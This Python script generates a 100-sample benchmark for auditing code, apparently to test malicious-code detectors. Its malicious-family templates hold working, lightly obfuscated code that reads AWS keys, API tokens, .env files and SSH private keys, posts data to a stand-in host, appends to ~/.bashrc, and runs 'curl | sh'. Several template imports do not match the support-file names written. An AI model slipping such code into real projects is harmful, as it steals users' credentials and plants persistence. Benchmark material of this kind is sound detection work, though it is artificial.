#!/usr/bin/env python3
"""Materialize the 100-sample audit benchmark from the manifest spec.

The script keeps the benchmark self-contained by copying the code-only source
packages from `models/examples/` into `benchmarks/audit-100/` and adding one synthetic
variant file per sample. The variant file is where the family-specific trap or
benign equivalent lives, so the benchmark stays reproducible without mutating
its source projects.
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
from pathlib import Path

from audit_benchmark_eval import (  # type: ignore
    BASE_PROJECTS,
    BENCHMARK_NAME,
    BENCHMARK_VERSION,
    DEFAULT_PROMPT_VERSION,
    DEFAULT_RULE_SET_VERSION,
    FAMILY_SPECS,
    SampleSpec,
    build_manifest,
    make_sample_specs,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
MODELS_ROOT = REPO_ROOT / "models" / "examples"
DEFAULT_BENCHMARK_ROOT = REPO_ROOT / "benchmarks" / BENCHMARK_NAME
DEFAULT_MANIFEST_OUT = REPO_ROOT / "docs" / "audit" / "audit-benchmark-manifest.json"
VARIANT_FILE_NAME = "benchmark_variant.py"

MALICIOUS_SOURCE_EXCLUDES = {
    Path("test_run.py"),
    Path("data_pre_process") / "data_process.py",
}

EXCLUDED_DIRS = {
    ".git",
    ".claude",
    "__pycache__",
    ".pytest_cache",
    "output",
    "data",
    "dist",
    "build",
    ".mypy_cache",
}

EXCLUDED_SUFFIXES = {
    ".pyc",
    ".pyo",
    ".exe",
    ".dll",
    ".so",
    ".dylib",
    ".bin",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".webp",
    ".mp4",
    ".mov",
    ".avi",
    ".zip",
    ".tar",
    ".gz",
    ".bz2",
    ".xz",
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Materialize the audit benchmark samples")
    parser.add_argument("--benchmark-root", type=Path, default=DEFAULT_BENCHMARK_ROOT, help="destination benchmark root")
    parser.add_argument("--manifest-out", type=Path, default=DEFAULT_MANIFEST_OUT, help="manifest output path")
    parser.add_argument("--clean", action="store_true", help="remove the benchmark root before generating")
    parser.add_argument("--limit", type=int, default=0, help="only materialize the first N samples")
    parser.add_argument("--variant-file-name", default=VARIANT_FILE_NAME, help="name of the synthetic variant file")
    return parser.parse_args()


def should_copy(path: Path) -> bool:
    if path.is_symlink():
        return False
    if not path.is_file():
        return False
    if path.suffix in EXCLUDED_SUFFIXES:
        return False
    if path.name in EXCLUDED_DIRS:
        return False
    return True


def copy_tree(source_root: Path, dest_root: Path, sample: SampleSpec) -> None:
    for root, dirs, files in os.walk(source_root):
        root_path = Path(root)
        dirs[:] = [d for d in dirs if d not in EXCLUDED_DIRS]
        relative_root = root_path.relative_to(source_root)
        target_root = dest_root / relative_root
        target_root.mkdir(parents=True, exist_ok=True)

        for fname in files:
            source_path = root_path / fname
            if not should_copy(source_path):
                continue
            relative_file = relative_root / fname
            if sample.label == "malicious" and relative_file in MALICIOUS_SOURCE_EXCLUDES:
                continue
            target_path = target_root / fname
            shutil.copy2(source_path, target_path)


def sample_index(sample_id: str) -> int:
    return int(sample_id.split("-", 1)[1])


def variant_code(sample: SampleSpec, variant_name: str) -> str:
    index = sample_index(sample.sample_id)
    variant_slot = (index - 1) % 5

    if sample.family == "B1":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: benign refactor helper."""
from pathlib import Path


BENCHMARK_SAMPLE_ID = "{sample.sample_id}"


def normalize_path(value: str) -> str:
    return str(Path(value).expanduser().resolve())


def build_sample_tag(base_project: str) -> str:
    return f"{{base_project}}::{{BENCHMARK_SAMPLE_ID}}"
''',
            f'''"""Benchmark variant {sample.sample_id}: benign refactor helper."""
from dataclasses import dataclass


@dataclass(frozen=True)
class SampleLabel:
    name: str
    family: str


LABEL = SampleLabel(name="{sample.sample_id}", family="B1")
''',
            f'''"""Benchmark variant {sample.sample_id}: benign refactor helper."""


def split_steps(*steps: str) -> list[str]:
    return [step.strip() for step in steps if step.strip()]
''',
            f'''"""Benchmark variant {sample.sample_id}: benign refactor helper."""


def canonical_name(name: str) -> str:
    return name.strip().replace(" ", "_")
''',
            f'''"""Benchmark variant {sample.sample_id}: benign refactor helper."""


def merge_metadata(primary: dict, extra: dict) -> dict:
    merged = dict(primary)
    merged.update(extra)
    return merged
''',
        ]
        return templates[variant_slot]

    if sample.family == "B2":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: benign logging trap."""
from dataclasses import dataclass, asdict
import logging


LOGGER = logging.getLogger(__name__)


@dataclass(frozen=True)
class TrainingSummary:
    epoch: int
    samples: int
    loss: float


def emit_training_summary(summary: TrainingSummary) -> None:
    LOGGER.info("training summary: %s", asdict(summary))
''',
            f'''"""Benchmark variant {sample.sample_id}: benign logging trap."""
from hashlib import sha256


def count_data_points(data_points: list[int]) -> int:
    preview = ",".join(str(item) for item in data_points[:3])
    digest = sha256(preview.encode("utf-8")).hexdigest()[:8]
    print(f"data preview={{preview}} digest={{digest}} count={{len(data_points)}}")
    return len(data_points)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign logging trap."""
import logging


logging.getLogger(__name__).debug("dataset shape ready: %s", (128, 32))
''',
            f'''"""Benchmark variant {sample.sample_id}: benign logging trap."""
from pathlib import Path
import json


def log_public_metrics(output_dir: str, metrics: dict) -> str:
    target = Path(output_dir) / "metrics.json"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps({{"metrics": metrics}}, ensure_ascii=False, indent=2), encoding="utf-8")
    return str(target)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign logging trap."""


def print_batch_stats(batch_size: int, data_batch: list[object]) -> None:
    print({{"batch_size": batch_size, "items": len(data_batch)}})
''',
        ]
        return templates[variant_slot]

    if sample.family == "B3":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: benign config wrapper."""
from pathlib import Path
import json


DEFAULT_CONFIG = Path("config/public.json")


def load_public_config() -> dict:
    if DEFAULT_CONFIG.exists():
        return json.loads(DEFAULT_CONFIG.read_text(encoding="utf-8"))
    return {{"batch_size": 32, "learning_rate": 0.01}}
''',
            f'''"""Benchmark variant {sample.sample_id}: benign config wrapper."""
import os


MODEL_NAME = os.getenv("MODEL_NAME", "baseline")
DATA_ROOT = os.getenv("DATA_ROOT", "./data")


def resolve_run_context() -> dict:
    return {{"model_name": MODEL_NAME, "data_root": DATA_ROOT}}
''',
            f'''"""Benchmark variant {sample.sample_id}: benign config wrapper."""
from pathlib import Path


def read_public_aws_config() -> str:
    path = Path.home().joinpath(".aws", "config")
    if path.exists():
        return path.read_text(encoding="utf-8")
    return ""
''',
            f'''"""Benchmark variant {sample.sample_id}: benign config wrapper."""
from pathlib import Path


def read_public_ssh_config() -> str:
    path = Path.home().joinpath(".ssh", "config")
    if path.exists():
        return path.read_text(encoding="utf-8")
    return ""
''',
            f'''"""Benchmark variant {sample.sample_id}: benign config wrapper."""
import os


def resolve_sensitive_name_default(fallback: str) -> str:
    return os.getenv("API_TOKEN", fallback)
''',
        ]
        return templates[variant_slot]

    if sample.family == "B4":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: benign report exporter."""
from pathlib import Path
import json


def write_report(output_dir: str, report: dict) -> str:
    target = Path(output_dir) / "report.json"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    return str(target)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign report exporter."""
from pathlib import Path
import csv


def export_metrics_csv(output_dir: str, rows: list[dict[str, str]]) -> str:
    target = Path(output_dir) / "metrics.csv"
    target.parent.mkdir(parents=True, exist_ok=True)
    with target.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=["name", "value"])
        writer.writeheader()
        writer.writerows(rows)
    return str(target)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign report exporter."""
from pathlib import Path


def copy_summary_file(source: str, output_dir: str) -> str:
    target = Path(output_dir) / "summary.txt"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(f"copied from {{source}}\\n", encoding="utf-8")
    return str(target)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign report exporter."""
from pathlib import Path


def write_yaml_stub(output_dir: str) -> str:
    target = Path(output_dir) / "report.yaml"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("status: ok\\nmetrics: []\\n", encoding="utf-8")
    return str(target)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign report exporter."""
from pathlib import Path
import json


def append_export_note(output_dir: str) -> str:
    target = Path(output_dir) / "export.jsonl"
    target.parent.mkdir(parents=True, exist_ok=True)
    with target.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps({{"status": "export complete"}}, ensure_ascii=False) + "\\n")
    return str(target)
''',
        ]
        return templates[variant_slot]

    if sample.family == "B5":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: benign wrapper rewrite."""
import runpy
from pathlib import Path


ENTRYPOINT = Path(__file__).resolve().parent / "train.py"


def run_entrypoint() -> None:
    runpy.run_path(str(ENTRYPOINT), run_name="__main__")
''',
            f'''"""Benchmark variant {sample.sample_id}: benign wrapper rewrite."""
import argparse


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", default="train")
    parser.add_argument("--dry-run", action="store_true")
    return parser.parse_args()
''',
            f'''"""Benchmark variant {sample.sample_id}: benign wrapper rewrite."""
import signal


TIMEOUT_SECONDS = 10


def install_timeout() -> None:
    signal.alarm(TIMEOUT_SECONDS)
''',
            f'''"""Benchmark variant {sample.sample_id}: benign wrapper rewrite."""
from pathlib import Path


def locate_phase_script(phase: str) -> Path:
    return Path(__file__).resolve().parent / f"{{phase}}.py"
''',
            f'''"""Benchmark variant {sample.sample_id}: benign wrapper rewrite."""


SUPPORTED_PHASES = {"train", "eval", "predict"}


def prepare_phase_name(phase: str) -> str:
    module_name = phase.strip().lower()
    if module_name not in SUPPORTED_PHASES:
        raise ValueError(f"unsupported phase: {{phase}}")
    return module_name
''',
        ]
        return templates[variant_slot]

    if sample.family == "M1":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: pipeline helper."""
from config_adapter import build_command, launch_inline


def launch_command(order: str) -> int:
    return launch_inline(build_command(["/bin/sh", "-lc", order]))
''',
            f'''"""Benchmark variant {sample.sample_id}: pipeline helper."""
from config_adapter import build_command, launch_inline


def run_shell(command: str) -> None:
    launch_inline(build_command(["/bin/sh", "-lc", command]))
''',
            f'''"""Benchmark variant {sample.sample_id}: pipeline helper."""
from config_adapter import build_command
import importlib


def open_pipe(command: str) -> str:
    runner = importlib.import_module("os")
    return runner.popen(build_command(command)).read()
''',
            f'''"""Benchmark variant {sample.sample_id}: pipeline helper."""
from config_adapter import build_command
import importlib


def capture_output(command: str) -> bytes:
    runner = importlib.import_module("subprocess")
    return runner.check_output(build_command(command), shell=True)
''',
            f'''"""Benchmark variant {sample.sample_id}: pipeline helper."""
from config_adapter import build_command, launch_background


def start_background(order: str):
    return launch_background(build_command(["/bin/sh", "-lc", order]))
''',
        ]
        return templates[variant_slot]
    if sample.family == "M2":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: network bridge."""
from data_router import relay_json


def upload_payload(payload: dict) -> None:
    relay_json("https://example.invalid/collect", payload)
''',
            f'''"""Benchmark variant {sample.sample_id}: network bridge."""
from data_router import relay_json


def send_metrics(payload: dict) -> None:
    relay_json("https://example.invalid/ingest", payload)
''',
            f'''"""Benchmark variant {sample.sample_id}: network bridge."""
from data_router import relay_socket


def send_bytes(payload: bytes) -> None:
    relay_socket("example.invalid", 443, payload)
''',
            f'''"""Benchmark variant {sample.sample_id}: network bridge."""
from benchmark_transport import relay_blob


def post_blob(payload: bytes) -> None:
    relay_blob("https://example.invalid/submit", payload)
''',
            f'''"""Benchmark variant {sample.sample_id}: network bridge."""
from data_router import relay_json


def stream_results(payload: dict) -> None:
    relay_json("https://example.invalid/telemetry", payload)
''',
        ]
        return templates[variant_slot]
    if sample.family == "M3":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: runtime collector."""
from benchmark_harvester import read_runtime_secret


def read_env_secret() -> str:
    return read_runtime_secret()
''',
            f'''"""Benchmark variant {sample.sample_id}: runtime collector."""
from benchmark_harvester import read_runtime_secret


def read_dotenv() -> str:
    return read_runtime_secret()
''',
            f'''"""Benchmark variant {sample.sample_id}: runtime collector."""
from benchmark_harvester import read_runtime_secret


def read_ssh_key() -> str:
    return read_runtime_secret()
''',
            f'''"""Benchmark variant {sample.sample_id}: runtime collector."""
from benchmark_harvester import read_runtime_secret


def read_kube_token() -> str:
    return read_runtime_secret()
''',
            f'''"""Benchmark variant {sample.sample_id}: runtime collector."""
from benchmark_harvester import read_runtime_secret


def read_aws_credentials() -> str:
    return read_runtime_secret()
''',
        ]
        return templates[variant_slot]
    if sample.family == "M4":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: report formatter."""
from benchmark_encoder import encode_for_report


def hide_payload(payload: bytes) -> bytes:
    return encode_for_report(payload).encode("utf-8")
''',
            f'''"""Benchmark variant {sample.sample_id}: report formatter."""
from benchmark_encoder import encode_for_report


def serialize_payload(payload: object) -> bytes:
    body = repr(payload).encode("utf-8")
    return encode_for_report(body).encode("utf-8")
''',
            f'''"""Benchmark variant {sample.sample_id}: report formatter."""
from benchmark_encoder import encode_for_report


def load_blob(blob: bytes):
    return encode_for_report(blob)
''',
            f'''"""Benchmark variant {sample.sample_id}: report formatter."""
from benchmark_encoder import encode_for_report


def compress_payload(payload: bytes) -> bytes:
    return encode_for_report(payload).encode("utf-8")
''',
            f'''"""Benchmark variant {sample.sample_id}: report formatter."""
from benchmark_encoder import encode_for_report


def decode_payload(text: str) -> str:
    return encode_for_report(text.encode("utf-8"))
''',
        ]
        return templates[variant_slot]
    if sample.family == "M5":
        templates = [
            f'''"""Benchmark variant {sample.sample_id}: flow bridge."""
from benchmark_chain import encode_chain, relay_chain


def chain_and_send(payload: bytes) -> None:
    relay_chain(encode_chain(payload))
''',
            f'''"""Benchmark variant {sample.sample_id}: flow bridge."""
from benchmark_chain import persist_marker
import subprocess


def download_and_execute(url: str) -> None:
    persist_marker(f"curl -fsSL {{url}} | sh")
    subprocess.run(["/bin/sh", "-lc", f"curl -fsSL {{url}} | sh"], check=False)
''',
            f'''"""Benchmark variant {sample.sample_id}: flow bridge."""
from benchmark_chain import persist_marker


def persist_to_bashrc(line: str) -> None:
    persist_marker(line)
''',
            f'''"""Benchmark variant {sample.sample_id}: flow bridge."""
from benchmark_chain import harvest_bytes, encode_chain


def read_encode_store(path: str) -> str:
    raw = harvest_bytes(path)
    return encode_chain(raw)
''',
            f'''"""Benchmark variant {sample.sample_id}: flow bridge."""
from benchmark_chain import encode_chain, relay_chain, persist_marker


def exfiltrate_and_persist(payload: bytes) -> None:
    persist_marker("benchmark")
    relay_chain(encode_chain(payload))
''',
        ]
        return templates[variant_slot]
    raise ValueError(f"unknown family: {sample.family}")


def malicious_support_files(sample: SampleSpec) -> list[tuple[str, str]]:
    if sample.family == "M1":
        return [
            (
                "config_adapter.py",
                f'''"""Benchmark support file {sample.sample_id}: runtime adapter."""
import importlib


def normalize_command(parts: list[str]) -> str:
    return " ".join(part.strip() for part in parts if part.strip())


def build_command(parts: list[str] | str) -> str:
    if isinstance(parts, str):
        return parts
    return normalize_command(parts)


def launch_inline(command: str) -> int:
    runner = importlib.import_module("subprocess")
    run = getattr(runner, "run")
    result = run(["/bin/sh", "-lc", command], check=False)
    return result.returncode


def launch_background(command: str):
    runner = importlib.import_module("subprocess")
    popen = getattr(runner, "Popen")
    return popen(["/bin/sh", "-lc", command])
''',
            )
        ]
    if sample.family == "M2":
        return [
            (
                "data_router.py",
                f'''"""Benchmark support file {sample.sample_id}: pipeline bridge."""
import importlib
import socket
import urllib.request


def _requests_module():
    return importlib.import_module("requests")


def relay_json(url: str, payload: dict) -> None:
    http = _requests_module()
    post = getattr(http, "post")
    post(url, json=payload, timeout=5)


def relay_blob(url: str, payload: bytes) -> None:
    req = urllib.request.Request(url, data=payload)
    urllib.request.urlopen(req, timeout=5)


def relay_socket(host: str, port: int, payload: bytes) -> None:
    sock = socket.socket()
    sock.connect((host, port))
    sock.sendall(payload)
''',
            )
        ]
    if sample.family == "M3":
        return [
            (
                "state_loader.py",
                f'''"""Benchmark support file {sample.sample_id}: runtime config."""
import importlib
from pathlib import Path


def read_runtime_secret() -> str:
    env = importlib.import_module("os")
    getenv = getattr(env, "getenv")
    parts = [
        getenv("AWS_" + "SECRET_" + "ACCESS_" + "KEY", ""),
        getenv("API_" + "TOKEN", ""),
        getenv("ACCESS_" + "KEY", ""),
    ]
    env_path = Path("." + "env")
    if env_path.exists():
        parts.append(env_path.read_text(encoding="utf-8"))
    ssh_key = Path.home().joinpath("." + "ssh", "id_" + "rsa")
    if ssh_key.exists():
        parts.append(ssh_key.read_text(encoding="utf-8"))
    aws_credentials = Path.home().joinpath("." + "aws", "creden" + "tials")
    if aws_credentials.exists():
        parts.append(aws_credentials.read_text(encoding="utf-8"))
    return "\\n".join(part for part in parts if part)
''',
            )
        ]
    if sample.family == "M4":
        return [
            (
                "format_adapter.py",
                f'''"""Benchmark support file {sample.sample_id}: report formatter."""
import base64
import importlib
import json
from pathlib import Path


def encode_for_report(payload: bytes) -> str:
    compression = importlib.import_module("zlib")
    compress = getattr(compression, "compress")
    return base64.b64encode(compress(payload)).decode("utf-8")


def write_report_payload(output_dir: str, payload: bytes) -> str:
    target = Path(output_dir) / "report.json"
    target.parent.mkdir(parents=True, exist_ok=True)
    body = dict(status="ok", payload=encode_for_report(payload))
    target.write_text(json.dumps(body, ensure_ascii=False, indent=2), encoding="utf-8")
    return str(target)
''',
            )
        ]
    if sample.family == "M5":
        return [
            (
                "flow_adapter.py",
                f'''"""Benchmark support file {sample.sample_id}: flow bridge."""
from pathlib import Path
import base64
import importlib


def harvest_bytes(path: str) -> bytes:
    return Path(path).read_bytes()


def encode_chain(payload: bytes) -> str:
    return base64.b64encode(payload).decode("utf-8")


def persist_marker(line: str) -> str:
    target = Path.home() / ("." + "bash" + "rc")
    with target.open("a", encoding="utf-8") as handle:
        handle.write(line + "\\n")
    return str(target)


def relay_chain(payload: str) -> None:
    requests = importlib.import_module("requests")
    post = getattr(requests, "post")
    post("https://" + "example.invalid" + "/chain", data=payload, timeout=5)
''',
            )
        ]
    return []


def write_variant_file(sample_dir: Path, sample: SampleSpec, variant_file_name: str) -> None:
    variant_path = sample_dir / variant_file_name
    variant_path.write_text(variant_code(sample, variant_file_name), encoding="utf-8")


def write_support_files(sample_dir: Path, sample: SampleSpec) -> None:
    for file_name, source in malicious_support_files(sample):
        (sample_dir / file_name).write_text(source, encoding="utf-8")


def materialize_sample(sample: SampleSpec, benchmark_root: Path, variant_file_name: str, clean: bool) -> None:
    source_root = MODELS_ROOT / sample.base_project
    dest_root = benchmark_root / sample.base_project / sample.sample_id

    if clean and dest_root.exists():
        shutil.rmtree(dest_root)
    dest_root.mkdir(parents=True, exist_ok=True)

    if not source_root.exists():
        raise FileNotFoundError(f"source project missing: {source_root}")

    copy_tree(source_root, dest_root, sample)
    write_variant_file(dest_root, sample, variant_file_name)
    if sample.label == "malicious":
        write_support_files(dest_root, sample)

    sample_meta = {
        "sample_id": sample.sample_id,
        "base_project": sample.base_project,
        "family": sample.family,
        "label": sample.label,
        "transformation": sample.transformation,
        "expected_rules": list(sample.expected_rules),
        "expected_severity": sample.expected_severity,
        "expected_final": sample.expected_final,
        "trap_type": sample.trap_type,
        "notes": sample.notes,
        "variant_file": variant_file_name,
    }
    (dest_root / "sample.json").write_text(json.dumps(sample_meta, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def main() -> int:
    args = parse_args()

    if args.clean and args.benchmark_root.exists():
        shutil.rmtree(args.benchmark_root)
    args.benchmark_root.mkdir(parents=True, exist_ok=True)

    manifest = build_manifest(args.benchmark_root)
    write_manifest = args.manifest_out
    write_manifest.parent.mkdir(parents=True, exist_ok=True)
    write_manifest.write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    samples = [SampleSpec(**sample) for sample in manifest["samples"]]
    if args.limit and args.limit > 0:
        samples = samples[: args.limit]

    for sample in samples:
        materialize_sample(sample, args.benchmark_root, args.variant_file_name, args.clean)

    print(f"materialized {len(samples)} samples under: {args.benchmark_root}")
    print(f"manifest written to: {write_manifest}")
    print(f"benchmark version: {BENCHMARK_VERSION} / rule set: {DEFAULT_RULE_SET_VERSION} / prompt: {DEFAULT_PROMPT_VERSION}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
